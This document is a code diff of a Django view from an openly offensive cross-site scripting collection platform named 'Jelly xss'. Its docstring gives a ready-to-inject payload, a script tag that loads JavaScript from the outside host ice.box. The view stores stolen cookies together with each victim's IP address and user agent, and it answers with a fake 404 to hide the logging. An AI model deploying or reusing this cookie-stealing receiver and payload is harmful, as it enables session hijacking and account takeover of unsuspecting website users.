@@ -2,12 +2,16 @@
 # -*- coding: utf-8 -*-
 
 '''
-jelly xss
+Jelly xss
 接口
 http://ice.box/plug/xss/?xss=
+
 xss.js
 http://ice.box/static/js/xss.js
 http://ice.box/static/js/x.js
+
+科学的插入姿势
+<script src="http://ice.box/static/js/x.js"></script>
 '''
 
 from django.shortcuts import render_to_response
@@ -22,8 +26,14 @@ from plug.models import *
 def xss(request):
     if request.method == 'GET':
         cookie = request.GET['xss']
+        if request.META.has_key('HTTP_X_FORWARDED_FOR'):  
+            ip =  request.META['HTTP_X_FORWARDED_FOR']  
+        else:  
+            ip = request.META['REMOTE_ADDR']
+        agent = request.META.get('HTTP_USER_AGENT')
+        cookie = cookie + '__IP:' + ip + '__agent:' + agent
         s = Xss(cookie=cookie)
         s.save()
-        return render_to_response("404.html")
+        raise Http404
     else:
-        return render_to_response("404.html")
+        raise Http404
